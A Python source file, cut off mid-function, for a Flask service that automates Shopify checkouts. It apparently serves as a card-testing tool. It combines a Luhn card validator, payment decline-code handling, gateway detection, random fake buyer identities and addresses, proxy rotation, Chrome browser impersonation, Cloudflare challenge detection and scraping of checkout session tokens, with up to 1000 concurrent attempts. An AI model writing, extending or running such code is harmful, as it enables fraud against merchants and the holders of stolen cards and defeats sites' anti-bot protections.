import html as _html
import hashlib
import json
import logging
import os
import random
import re
import string
import threading
import time
import uuid
from urllib.parse import urlencode, urlparse, quote

import requests as _requests
from flask import Flask, jsonify, request
from curl_cffi import requests as curl_requests
from waitress import serve

# ══════════════════════════════ CONFIG ═══════════════════════════════════════

STOREFRONT_API_VER  = "2024-01"
POLL_FOR_RECEIPT_ID = "a73d687818f68c1103f4dede7028c2730296e7e3df06a997cbae7e50dd94e91d"

_checkout_sem = threading.Semaphore(1000)

HUENCY_THREADS      = int(os.environ.get("HUENCY_THREADS", "200"))
HUENCY_CHANNELS     = int(os.environ.get("HUENCY_CHANNELS", "1000"))
CHECKOUT_DEADLINE_S = float(os.environ.get("HUENCY_DEADLINE", "45"))
STEP0_MAX_ATTEMPTS  = max(1, int(os.environ.get("HUENCY_STEP0_RETRIES", "3")))
STEP0_BACKOFF_S     = float(os.environ.get("HUENCY_STEP0_BACKOFF", "0.6"))

_tl = threading.local()
def _set_deadline(seconds: float) -> float:
    _tl.deadline = time.monotonic() + seconds
    return _tl.deadline
def _over() -> bool:
    return time.monotonic() > getattr(_tl, "deadline", float("inf"))

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("shopii")
app = Flask(__name__)

# ══════════════════════════════ CONSTANTS ════════════════════════════════════

_SITE_CONFIG_CODES = frozenset((
    "UNACCEPTABLE_PAYMENT_AMOUNT",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
    "BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH",
    "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
    "VALIDATION_CUSTOM",
    "GENERIC_ERROR",
    "INVALID_PURCHASE_TYPE",
    "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED",
    "AMOUNT_TOO_SMALL",
    "MERCHANDISE_OUT_OF_STOCK",
    "DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED",
    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
    "DELIVERY_NONE_AVAILABLE",
    "DELIVERY_NO_STRATEGIES_AVAILABLE",
    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
    "DELIVERY_SELECTED_OPTION_NOT_AVAILABLE",
    "DELIVERY_LINE_NOT_FOUND",
    "TAX_TAX_INCLUSIVITY_MISMATCH",
    "TAX_NEW_TAX_MUST_BE_ACCEPTED",
    "AUTH_GATED_CHECKOUT",
    "STORE_NOT_ACCEPTING_ORDERS",
    "CARD_CHALLENGE",
    "PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY",
))

_RETRY_DECLINE_CODES = frozenset((
    "PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE",
    "PROCESSING_ERROR",
))

_RECOVERABLE_VIOLATION_RE = re.compile(
    r'"code"\s*:\s*"(?:DELIVERY_[A-Z_]+|BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH|INVALID_PAYMENT_METHOD|WAITING_PENDING_TERMS|TAX_[A-Z_]+)"'
)

# ══════════════════════════════ EXTRACTION HELPERS ═══════════════════════════

def ext_embedded_handle(body: str) -> str:
    try:
        mobj = json.loads(body)
        sub = mobj.get("data", {}).get("submitForCompletion") or mobj.get("data", {}).get("proposal") or mobj.get("submitForCompletion") or mobj.get("proposal") or {}
        for prop_key in ("sellerProposal", "buyerProposal", "proposal"):
            prop = sub.get(prop_key) or {}
            deliv = prop.get("delivery") or {}
            for ln in deliv.get("deliveryLines") or []:
                strat = ln.get("selectedDeliveryStrategy") or {}
                h = strat.get("handle") or (strat.get("deliveryStrategyByHandle") or {}).get("handle") or ""
                if h and h != "shop_promise":
                    return str(h)
                for avail in ln.get("availableDeliveryStrategies") or []:
                    h = avail.get("handle") or (avail.get("deliveryStrategyByHandle") or {}).get("handle") or ""
                    if h and h != "shop_promise":
                        return str(h)
                for strat in ln.get("deliveryStrategies") or []:
                    h = strat.get("handle") or ""
                    if h and h != "shop_promise":
                        return str(h)
            deliv_exp = prop.get("deliveryExpectations") or {}
            for de in deliv_exp.get("deliveryExpectations") or []:
                dh = de.get("deliveryStrategyHandle")
                if dh and dh != "shop_promise":
                    return str(dh)
            for macro in deliv.get("deliveryMacros") or []:
                for mh in macro.get("deliveryStrategyHandles") or []:
                    if mh and mh != "shop_promise":
                        return str(mh)
    except Exception:
        pass
    return ""

_IS_SHIPPING_REQ_RE = re.compile(r'"isShippingRequired"\s*:\s*(false|true)', re.IGNORECASE)

def ext_is_shipping_required(body: str, default: bool = True) -> bool:
    try:
        data = json.loads(body) if isinstance(body, str) else body
        if isinstance(data, dict):
            for root in (data.get("data", {}), data):
                for ck in ("negotiation", "submitForCompletion", "proposal", "session"):
                    cont = root.get(ck) or {}
                    res = cont.get("result") if isinstance(cont, dict) and "result" in cont else cont
                    if isinstance(res, dict) and "negotiate" in res:
                        res = res["negotiate"].get("result") or res["negotiate"]
                    for pkey in ("sellerProposal", "buyerProposal", "proposal"):
                        prop = (res.get(pkey) if isinstance(res, dict) else {}) or {}
                        if "isShippingRequired" in prop:
                            return bool(prop["isShippingRequired"])
    except Exception:
        pass
    m = _IS_SHIPPING_REQ_RE.search(body)
    if m:
        return m.group(1).lower() == "true"
    return default

def _plan_from_submit(body: str):
    out = {
        "queue":   ext_queue_token(body),
        "handle":  ext_embedded_handle(body) or ext_delivery_handle(body),
        "signed":  ext_signed_handles(body),
        "shipping": ext_shipping_amount(body),
        "total":   ext_checkout_total(body) or ext_running_total(body),
        "flex":    ext_payment_flex_terms_id(body),
        "pmethod": ext_payment_method_id(body),
        "country": ext_seller_country(body),
        "currency": ext_seller_currency(body),
        "tax_amt": ext_seller_tax_amt(body),
        "tax_incl": ext_seller_tax_included_amt(body),
        "requires_shipping": ext_is_shipping_required(body, default=None),
    }
    return out if any(out.values()) else None

def luhn_valid(number: str) -> bool:
    digits = [int(c) for c in str(number) if c.isdigit()]
    if len(digits) < 12:
        return False
    checksum, parity = 0, len(digits) % 2
    for i, d in enumerate(digits):
        if i % 2 == parity:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

# ══════════════════════════════ CURRENCY MAP ══════════════════════════════════

CURRENCY_TO_COUNTRY = {
    "USD":"US","CAD":"CA","GBP":"GB","EUR":"DE","AUD":"AU","NZD":"NZ",
    "SGD":"SG","HKD":"HK","JPY":"JP","CNY":"CN","INR":"IN","MXN":"MX",
    "BRL":"BR","ARS":"AR","CLP":"CL","COP":"CO","PEN":"PE","VND":"VN",
    "THB":"TH","IDR":"ID","PHP":"PH","MYR":"MY","TWD":"TW","KRW":"KR",
    "PKR":"PK","BDT":"BD","LKR":"LK","NPR":"NP","MMK":"MM","KHR":"KH",
    "LAK":"LA","MNT":"MN","AFN":"AF","IRR":"IR","IQD":"IQ","SYP":"SY",
    "LBP":"LB","JOD":"JO","SAR":"SA","AED":"AE","QAR":"QA","KWD":"KW",
    "BHD":"BH","OMR":"OM","YER":"YE","EGP":"EG","SDG":"SD","ETB":"ET",
    "KES":"KE","UGX":"UG","TZS":"TZ","RWF":"RW","ZMW":"ZM","ZWL":"ZW",
    "MZN":"MZ","NAD":"NA","ZAR":"ZA","BWP":"BW","SZL":"SZ","LSL":"LS",
    "MGA":"MG","SCR":"SC","MUR":"MU","MVR":"MV","SEK":"SE","NOK":"NO",
    "DKK":"DK","ISK":"IS","CHF":"CH","CZK":"CZ","PLN":"PL","HUF":"HU",
    "RON":"RO","BGN":"BG","HRK":"HR","RSD":"RS","BAM":"BA","MKD":"MK",
    "ALL":"AL","AMD":"AM","AZN":"AZ","GEL":"GE","KZT":"KZ","KGS":"KG",
    "TJS":"TJ","TMT":"TM","UZS":"UZ","BYN":"BY","UAH":"UA","MDL":"MD",
    "RUB":"RU","TRY":"TR","ILS":"IL","DZD":"DZ","MAD":"MA","TND":"TN",
    "LYD":"LY","GMD":"GM","GNF":"GN","SLL":"SL","LRD":"LR","GHS":"GH",
    "NGN":"NG","XOF":"SN","XAF":"CM","CDF":"CD","AOA":"AO","NIO":"NI",
    "HNL":"HN","GTQ":"GT","BZD":"BZ","TTD":"TT","JMD":"JM","HTG":"HT",
    "BBD":"BB","XCD":"AG","BSD":"BS","KYD":"KY","BMD":"BM","AWG":"AW",
    "BOB":"BO","UYU":"UY","PYG":"PY","GYD":"GY","SRD":"SR","FJD":"FJ",
    "PGK":"PG","SBD":"SB","TOP":"TO","WST":"WS","VUV":"VU","KPW":"KP",
    "MOP":"MO","BND":"BN","KID":"KI","STN":"ST","CVE":"CV","MRU":"MR",
    "SOS":"SO","DJF":"DJ","ERN":"ER","KMF":"KM","BIF":"BI","MWK":"MW",
}

# ══════════════════════════════ COUNTRY ADDRESSES ════════════════════════════

COUNTRY_ADDRESSES = {
    "US": dict(first_name="james",last_name="anderson",address1="428 Madison Ave",address2="Apt 4",city="New York",country_code="US",zone_code="NY",postal_code="10017",phone="+12125550100"),
    "CA": dict(first_name="james",last_name="anderson",address1="200 Kent St",address2="",city="Ottawa",country_code="CA",zone_code="ON",postal_code="K1A 0G9",phone="+16135550100"),
    "GB": dict(first_name="james",last_name="anderson",address1="10 Downing St",address2="",city="London",country_code="GB",zone_code="ENG",postal_code="SW1A 2AA",phone="+442012345678"),
    "AU": dict(first_name="james",last_name="anderson",address1="1 George St",address2="",city="Sydney",country_code="AU",zone_code="NSW",postal_code="2000",phone="+61212345678"),
    "DE": dict(first_name="james",last_name="anderson",address1="Friedrichstr 100",address2="",city="Berlin",country_code="DE",zone_code="BE",postal_code="10117",phone="+493012345678"),
    "FR": dict(first_name="james",last_name="anderson",address1="10 Rue de Rivoli",address2="",city="Paris",country_code="FR",zone_code="IDF",postal_code="75001",phone="+33112345678"),
    "NZ": dict(first_name="james",last_name="anderson",address1="1 Queen St",address2="",city="Auckland",country_code="NZ",zone_code="AUK",postal_code="1010",phone="+6491234567"),
    "IE": dict(first_name="james",last_name="anderson",address1="1 Grafton St",address2="",city="Dublin",country_code="IE",zone_code="D",postal_code="D02 Y006",phone="+35311234567"),
    "SG": dict(first_name="james",last_name="anderson",address1="1 Raffles Quay",address2="",city="Singapore",country_code="SG",zone_code="",postal_code="048583",phone="+6561234567"),
    "HK": dict(first_name="james",last_name="anderson",address1="1 Harbour Rd",address2="",city="Hong Kong",country_code="HK",zone_code="",postal_code="",phone="+85221234567"),
    "JP": dict(first_name="james",last_name="anderson",address1="1-1 Marunouchi",address2="",city="Tokyo",country_code="JP",zone_code="13",postal_code="100-0005",phone="+81312345678"),
    "IN": dict(first_name="james",last_name="anderson",address1="1 MG Road",address2="",city="Bangalore",country_code="IN",zone_code="KA",postal_code="560001",phone="+918012345678"),
    "MX": dict(first_name="james",last_name="anderson",address1="Paseo de la Reforma 1",address2="",city="Mexico City",country_code="MX",zone_code="CMX",postal_code="06600",phone="+5215512345678"),
    "BR": dict(first_name="james",last_name="anderson",address1="Av Paulista 1000",address2="",city="Sao Paulo",country_code="BR",zone_code="SP",postal_code="01310-100",phone="+551112345678"),
    "SE": dict(first_name="james",last_name="anderson",address1="Kungsgatan 1",address2="",city="Stockholm",country_code="SE",zone_code="",postal_code="111 43",phone="+46812345678"),
    "NO": dict(first_name="james",last_name="anderson",address1="Karl Johans Gate 1",address2="",city="Oslo",country_code="NO",zone_code="",postal_code="0154",phone="+4712345678"),
    "DK": dict(first_name="james",last_name="anderson",address1="Stroget 1",address2="",city="Copenhagen",country_code="DK",zone_code="",postal_code="1000",phone="+4512345678"),
    "CH": dict(first_name="james",last_name="anderson",address1="Bahnhofstrasse 1",address2="",city="Zurich",country_code="CH",zone_code="ZH",postal_code="8001",phone="+41442345678"),
    "NL": dict(first_name="james",last_name="anderson",address1="Damrak 1",address2="",city="Amsterdam",country_code="NL",zone_code="",postal_code="1012 LG",phone="+31201234567"),
    "ZA": dict(first_name="james",last_name="anderson",address1="1 Long St",address2="",city="Cape Town",country_code="ZA",zone_code="WC",postal_code="8001",phone="+27211234567"),
    "AE": dict(first_name="james",last_name="anderson",address1="Sheikh Zayed Rd",address2="",city="Dubai",country_code="AE",zone_code="DU",postal_code="00000",phone="+97141234567"),
    "SA": dict(first_name="james",last_name="anderson",address1="King Fahd Rd",address2="",city="Riyadh",country_code="SA",zone_code="01",postal_code="11564",phone="+966112345678"),
    "IL": dict(first_name="james",last_name="anderson",address1="Rothschild Blvd 1",address2="",city="Tel Aviv",country_code="IL",zone_code="TA",postal_code="6688101",phone="+97236123456"),
    "TR": dict(first_name="james",last_name="anderson",address1="Istiklal Caddesi 1",address2="",city="Istanbul",country_code="TR",zone_code="34",postal_code="34433",phone="+902121234567"),
    "PL": dict(first_name="james",last_name="anderson",address1="ul Nowy Swiat 1",address2="",city="Warsaw",country_code="PL",zone_code="",postal_code="00-001",phone="+48221234567"),
    "CZ": dict(first_name="james",last_name="anderson",address1="Vaclavske Namesti 1",address2="",city="Prague",country_code="CZ",zone_code="",postal_code="110 00",phone="+420212345678"),
    "HU": dict(first_name="james",last_name="anderson",address1="Andrassy Ut 1",address2="",city="Budapest",country_code="HU",zone_code="",postal_code="1062",phone="+3612345678"),
    "RO": dict(first_name="james",last_name="anderson",address1="Calea Victoriei 1",address2="",city="Bucharest",country_code="RO",zone_code="B",postal_code="010063",phone="+40212345678"),
    "MY": dict(first_name="james",last_name="anderson",address1="Jalan Bukit Bintang 1",address2="",city="Kuala Lumpur",country_code="MY",zone_code="14",postal_code="55100",phone="+60312345678"),
    "PH": dict(first_name="james",last_name="anderson",address1="Ayala Ave 1",address2="",city="Makati",country_code="PH",zone_code="00",postal_code="1226",phone="+63212345678"),
    "TH": dict(first_name="james",last_name="anderson",address1="Silom Rd 1",address2="",city="Bangkok",country_code="TH",zone_code="10",postal_code="10500",phone="+6622345678"),
    "ID": dict(first_name="james",last_name="anderson",address1="Jl Sudirman 1",address2="",city="Jakarta",country_code="ID",zone_code="JK",postal_code="10220",phone="+62212345678"),
}

_FIRST_NAMES = ["James","Michael","Robert","David","William","John","Alex","Sam","Chris","Ryan",
                "Daniel","Matthew","Anthony","Mark","Donald","Steven","Paul","Andrew","Joshua","Kevin"]
_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
_EMAIL_DOMS  = ["gmail.com", "yahoo.com", "outlook.com", "icloud.com", "hotmail.com"]

_RANDOM_US_ADDRESSES = [
    {"address1": "428 Madison Ave", "address2": "Apt 4", "city": "New York", "zone_code": "NY", "postal_code": "10017"},
    {"address1": "123 Main St", "address2": "", "city": "New York", "zone_code": "NY", "postal_code": "10001"},
    {"address1": "4827 Maple Ave", "address2": "", "city": "Chicago", "zone_code": "IL", "postal_code": "60622"},
    {"address1": "9180 Oakwood Blvd", "address2": "", "city": "Austin", "zone_code": "TX", "postal_code": "78704"},
    {"address1": "2217 Jefferson Dr", "address2": "", "city": "Los Angeles", "zone_code": "CA", "postal_code": "90014"},
    {"address1": "834 Pell St", "address2": "", "city": "Boston", "zone_code": "MA", "postal_code": "02111"},
    {"address1": "1560 Rosewood Ln", "address2": "", "city": "Seattle", "zone_code": "WA", "postal_code": "98109"},
    {"address1": "6124 Peachtree Ct", "address2": "", "city": "Atlanta", "zone_code": "GA", "postal_code": "30309"},
    {"address1": "770 N Las Vegas Blvd", "address2": "", "city": "Las Vegas", "zone_code": "NV", "postal_code": "89101"},
    {"address1": "3390 Greenway Dr", "address2": "", "city": "Miami", "zone_code": "FL", "postal_code": "33130"},
    {"address1": "5400 Briarcliff Rd", "address2": "", "city": "Denver", "zone_code": "CO", "postal_code": "80202"},
]

def generate_profile(country: str = "US") -> tuple:
    fn = random.choice(_FIRST_NAMES)
    ln = random.choice(_LAST_NAMES)
    num = random.randint(10, 9999)
    dom = random.choice(_EMAIL_DOMS)
    sep = random.choice([".", "", "_"])
    email = f"{fn.lower()}{sep}{ln.lower()}{num}@{dom}"

    base_addr = COUNTRY_ADDRESSES.get(country, COUNTRY_ADDRESSES["US"]).copy()
    base_addr["first_name"] = fn.lower()
    base_addr["last_name"] = ln.lower()
    if country == "US":
        pick = random.choice(_RANDOM_US_ADDRESSES)
        base_addr["address1"] = pick["address1"]
        base_addr["address2"] = pick["address2"]
        base_addr["city"] = pick["city"]
        base_addr["zone_code"] = pick["zone_code"]
        base_addr["postal_code"] = pick["postal_code"]
        base_addr["phone"] = f"+1{random.randint(201, 989)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    elif country == "CA":
        base_addr["phone"] = f"+1{random.randint(416, 613)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    elif country == "GB":
        base_addr["phone"] = f"+447{random.randint(100000000, 999999999)}"
    return email, base_addr

def address_for_country(country: str, first_name: str = "", last_name: str = "") -> dict:
    base = COUNTRY_ADDRESSES.get(country, COUNTRY_ADDRESSES["US"]).copy()
    if first_name:
        base["first_name"] = first_name
    if last_name:
        base["last_name"] = last_name
    return base

# ══════════════════════════════ PRE-COMPILED REGEXES ════════════════════════════

_UA        = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
_SEC_CH_UA = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'

_STOREFRONT_TOKEN_RES = [
    re.compile(r'"accessToken"\s*:\s*"([0-9a-f]{32})"'),
    re.compile(r'"storefrontAccessToken"\s*:\s*"([0-9a-f]{32})"'),
    re.compile(r'Shopify\.AccessToken\s*=\s*["\']([0-9a-f]{32})["\']'),
    re.compile(r'window\.shopifyStorefrontToken\s*=\s*["\']([0-9a-f]{32})["\']'),
    re.compile(r'"apiKey"\s*:\s*"([0-9a-f]{32})"'),
]
_CHECKOUT_TOKEN_RE  = re.compile(r'/checkouts/cn/([^/?]+)')
_SESSION_TOKEN_RES = [
    re.compile(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="serialized-session-token"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="sessionToken"\s+content="([^"]*)"'),
    re.compile(r'"sessionToken"\s*:\s*"([^"]{20,})"'),
    re.compile(r"'sessionToken'\s*:\s*'([^']{20,})'"),
    re.compile(r'window\.Shopify\.Checkout\.sessionToken\s*=\s*["\']([^"\']+)["\']'),
]
_PAT_ID_RE          = re.compile(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"')
_STABLE_ID_RE       = re.compile(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"')
_COMMIT_SHA_RE      = re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
_SOURCE_TOKEN_RES = [
    re.compile(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="serialized-source-token"\s+content="([^"]*)"'),
    re.compile(r'<meta\s+name="sourceToken"\s+content="([^"]*)"'),
    re.compile(r'"sourceToken"\s*:\s*"([^"]{20,})"'),
    re.compile(r'window\.Shopify\.Checkout\.sourceToken\s*=\s*["\']([^"\']+)["\']'),
]
_IDENT_SIG_RE       = re.compile(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"')
_QUEUE_TOKEN_RE     = re.compile(r'"queueToken"\s*:\s*"([^"]+)"')
_RECEIPT_ID_RE      = re.compile(r'"id"\s*:\s*"(gid://shopify/[A-Za-z]*Receipt/[0-9a-zA-Z]+)"')
_RECEIPT_SESS_RE    = re.compile(r'(?:"receiptSessionToken"|"sessionToken")\s*:\s*"([^"]{8,})"')
_POLL_DELAY_RE      = re.compile(r'"pollDelay"\s*:\s*(\d+)')
_ERROR_CODE_RE      = re.compile(r'"code"\s*:\s*"([^"]+)"')
_PAY_ERR_CODE_RE    = re.compile(r'"(?:paymentError|errorInformation|processingError)"\s*:\s*\{[^{}]*?"code"\s*:\s*"([^"]+)"', re.DOTALL)
_PROP_ERROR_RE      = re.compile(r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"')
_TYPENAME_RE        = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
_PCI_SESSION_ID_RE  = re.compile(r'"id"\s*:\s*"([A-Za-z0-9_\-]+)"')
_DELIVERY_STRAT_HANDLE_RE = re.compile(r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"')
_DELIVERY_RE           = re.compile(r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"', re.DOTALL)
_DELIVERY_BY_HANDLE_RE = re.compile(r'"deliveryStrategyByHandle"\s*:\s*\{[^{}]*?"handle"\s*:\s*"([^"]+)"', re.DOTALL)
_DELIVERY_AVAIL_RE     = re.compile(r'"availableDeliveryStrategies"\s*:\s*\[[^\]]*?"handle"\s*:\s*"([^"]+)"', re.DOTALL)
_DELIVERY_HANDLE_RE    = re.compile(r'"deliveryHandle"\s*:\s*"([^"]+)"')
_DELIVERY_FB_RE        = re.compile(r'"handle"\s*:\s*"(shopify-[^"]+)"')
_DELIVERY_HASH_RE      = re.compile(r'"handle"\s*:\s*"([0-9a-f]{32}-[0-9a-f]{32})"')
_SIGNED_HANDLE_RE   = re.compile(r'"signedHandle"\s*:\s*"([^"]+)"')
_SHIPPING_AMT_RE    = re.compile(r'"deliveryStrategyBreakdown"\s*:\s*\[[^\]]*?"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', re.DOTALL)
_CHECKOUT_TOTAL_RE  = re.compile(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_TOTAL_RE    = re.compile(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_RUNNING_TOTAL_RE   = re.compile(r'"runningTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_TAX_AMT_RE  = re.compile(r'"totalTaxAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_TAX_INCL_RE = re.compile(r'"totalAmountIncludedInTarget"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"')
_SELLER_CUR_RE      = re.compile(r'"supportedCurrencies"\s*:\s*\["([^"]+)"')
_SELLER_CTR_RE      = re.compile(r'"supportedCountries"\s*:\s*\["([^"]+)"')
_PMI_RE             = re.compile(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"\s*,\s*"name"\s*:\s*"shopify_payments"')
_PAY_FLEX_TERMS_RE  = re.compile(r'"paymentFlexibilityPaymentTermsTemplate"\s*:\s*\{\s*"id"\s*:\s*"([^"]+)"')
_PMI2_RE            = re.compile(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"')
_PMI3_RE            = re.compile(r'"directPaymentMethod"\s*:\s*\{[^{}]*?"paymentMethodIdentifier"\s*:\s*"([^"]+)"', re.DOTALL)
_MERCH_PRICE_RE     = re.compile(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', re.DOTALL)
_ACTIONS_JS_RE      = re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)')
_ALL_JS_RE          = re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)')
_SKIP_JS_RE         = re.compile(r'(?i)(locale-|polyfills|libphonenumber|qrcodegen|getCountryCallingCode|/css/|FullScreenBackground|component-[A-Z])')
_PROC_JS_PATS = [
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*useHasOrdersFromMultipleShops[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/page-Processing[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/page-ThankYou[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Pp]rocessing[A-Za-z0-9_.-]*\.js)'),
    re.compile(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]*[Rr]eceipt[A-Za-z0-9_.-]*\.js)'),
]
_PROPOSAL_ID_RE = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"')
_SUBMIT_ID_RE   = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"')
_PATCH_CUR_RE  = re.compile(r'"currencyCode"\s*:\s*"[A-Z]{3}"')
_PATCH_PRES_RE = re.compile(r'"presentmentCurrency"\s*:\s*"[A-Z]{3}"')
_PATCH_CTR_RE  = re.compile(r'"countryCode"\s*:\s*"[A-Z]{2}"')
_PATCH_PHN_RE  = re.compile(r'"phoneCountryCode"\s*:\s*"[A-Z]{2}"')
_CURRENCY_RE   = re.compile(r'"currency"\s*:\s*"([A-Z]{3})"')
_CUR_CODE_RE   = re.compile(r'"currencyCode"\s*:\s*"([A-Z]{3})"')
_HTML_DASH_RE  = re.compile(r'<a href="(https?://[^"]+)"[^>]*>[^<]*</a></td><td class="price">\$?([^<]+)</td>')
_NUM_RE        = re.compile(r'[-+]?\d*\.?\d+')

# ══════════════════════════════ GATEWAY TABLES ════════════════════════════════

_GATEWAY_DISPLAY = {
    "shopify_payments":"Shopify Payments","stripe":"Stripe","stripe_donation":"Stripe",
    "stripe_payments":"Stripe","braintree":"Braintree","paypal":"PayPal",
    "paypal_express":"PayPal Express","paypal_express_checkout":"PayPal",
    "authorize_net":"Authorize.net","authorizenet":"Authorize.net","square":"Square",
    "adyen":"Adyen","checkout.com":"Checkout.com","worldpay":"Worldpay",
    "cybersource":"CyberSource","moneris":"Moneris","moneris_us":"Moneris",
    "bambora":"Bambora","global_payments":"Global Payments","elavon":"Elavon",
    "mollie":"Mollie","klarna":"Klarna","afterpay":"Afterpay",
    "afterpay_clearpay":"Afterpay","zip":"Zip","amazon_payments":"Amazon Pay",
    "shop_pay":"Shop Pay","apple_pay":"Apple Pay","google_pay":"Google Pay",
    "bolt":"Bolt","affirm":"Affirm","nmi":"NMI","nuvei":"Nuvei",
    "paysafe":"Paysafe","razorpay":"Razorpay","payu":"PayU","cashfree":"Cashfree",
    "ccavenue":"CCAvenue","eway":"eWay","windcave":"Windcave","bluesnap":"BlueSnap",
    "cybersource_flex":"CyberSource","nuvei_shopify_payments":"Nuvei",
}
_GW_PATS = [
    re.compile(r'"paymentMethodIdentifier"\s*:\s*"[^"]*"\s*,\s*"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"name"\s*:\s*"([^"]+)"\s*,\s*"paymentMethodIdentifier"'),
    re.compile(r'"extensibilityDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"providerDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentProvider"\s*:\s*\{"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"gatewayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentGateway"\s*:\s*"([^"]+)"'),
    re.compile(r'"availablePaymentLines".*?"displayName"\s*:\s*"([^"]+)"', re.DOTALL),
]

# ══════════════════════════════ HELPERS ═══════════════════════════════════════

def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise ValueError("empty proxy")
    if "://" not in p:
        parts = p.split(":")
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    parsed = urlparse(p)
    if not parsed.hostname:
        raise ValueError(f"invalid proxy: {raw}")
    return p

def generate_attempt_token(checkout_token: str) -> str:
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{checkout_token}-{suffix}"

def generate_page_id() -> str:
    return str(uuid.uuid4())

def patch_payload(payload: str, currency: str, country: str) -> str:
    payload = _PATCH_CUR_RE.sub(f'"currencyCode": "{currency}"', payload)
    payload = _PATCH_PRES_RE.sub(f'"presentmentCurrency": "{currency}"', payload)
    payload = _PATCH_CTR_RE.sub(f'"countryCode": "{country}"', payload)
    payload = _PATCH_PHN_RE.sub(f'"phoneCountryCode": "{country}"', payload)
    return payload

def is_cloudflare(body: str) -> bool:
    lo = body.lower()
    return ("<title>just a moment" in lo or "cf_chl_" in lo or "cf-chl-" in lo or "jschl_" in lo or
            'id="challenge-running"' in lo or 'id="challenge-form"' in lo or 'class="challenge-form"' in lo or
            "cf-browser-verification" in lo or
            "checking if the site connection is secure" in lo or
            "checking your browser before accessing" in lo or
            "enable javascript and cookies to continue" in lo)

def has_currency_not_supported(body: str) -> bool:
    return "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in body

def make_session(proxy_url: str = "") -> curl_requests.Session:
    s = curl_requests.Session(impersonate="chrome120")
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    s.timeout = 20
    return s

def make_api_session(proxy_url: str = "") -> _requests.Session:
